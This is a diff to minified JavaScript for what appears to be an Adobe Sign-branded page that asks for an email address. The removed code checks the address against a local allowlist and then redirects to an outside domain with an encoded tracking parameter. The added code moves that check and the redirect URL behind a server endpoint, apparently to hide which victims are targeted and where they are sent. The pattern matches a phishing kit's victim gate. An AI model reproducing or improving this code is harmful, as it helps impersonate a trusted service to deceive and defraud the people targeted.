@@ -3998,27 +3998,28 @@ const Cl = {
             if (!this.isValidEmail(this.emailInput)) {
                 this.errorMessage = "Please enter a valid email address";
                 return
-                 }
-           this.errorMessage = ".......";
-             this.isLoading = !0;
-
-try {
-    const e = await fetch("allowedEmails.json");
-    const t = await e.json();
-
-    if (t.allowedEmails.includes(this.emailInput)) {
-        window.location = "https://agendeonline.com/i/?c3Y9Z2VuZXJhbCZyPXpzJnVpZD1VU0VSMDUwNjIwMjVVMjAwNjA1MTMmcz03WA==N0123N";
-    } else {
-        throw new Error("Email not authorized");
-    }
-} catch (e) {
-    this.errorMessage = e.message || "Unable to verify email";
-} finally {
-    this.isLoading = false;
-}
-
-    }
-}
+                }
+            this.errorMessage = "",
+            this.isLoading = !0;
+            try {
+                const e = await fetch("/api/verify-email", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: this.emailInput
+                    })
+                })
+                  , t = await e.json();
+                if (!e.ok)
+                    throw new Error(t.message || "Verification failed");
+                t.redirectUrl && (window.location = t.redirectUrl)
+            } catch (e) {
+                this.errorMessage = e.message || "Unable to verify email"
+            } finally {
+                this.isLoading = !1
+            }
   , Tl = {
     class: "adobe-sign-container"
 }
